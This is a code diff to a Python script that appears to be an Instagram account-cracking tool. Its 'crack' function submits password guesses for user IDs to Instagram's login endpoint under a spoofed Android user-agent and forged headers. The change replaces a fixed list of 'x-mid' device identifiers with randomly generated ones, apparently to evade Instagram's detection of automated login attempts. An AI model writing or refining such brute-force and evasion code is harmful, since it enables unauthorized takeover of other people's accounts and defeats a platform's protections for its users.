@@ -157,8 +157,11 @@ def timezone_offset():
        ofs = tim.utcoffset().total_seconds()/60/60
        return ofs
 
-def SetMid():
-       return '' if len(MID) == 0 else random.choice(MID)
+def generate_x_mid():
+    prefix = "MID"  # Instagram uses MID prefix
+    chars = string.ascii_letters + string.digits + "-_"
+    body = "".join(random.choice(chars) for _ in range(22))  # 22 chars = typical MID length
+    return prefix + body
 
 def Blok_ID():
        v23 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
@@ -222,6 +225,7 @@ def crack(uid, pww, total_idz):
             session = requests.Session()
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
+            x_mid = generate_x_mid()
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             session.headers.update({
@@ -248,7 +252,7 @@ def crack(uid, pww, total_idz):
           'priority': 'u=3',
           'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
           'accept-language': 'id-ID, en-US',
-          'x-mid': str(SetMid()),
+          'x-mid': x_mid,
           'ig-intended-user-id': '0',
           'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
           'content-length': '3146',
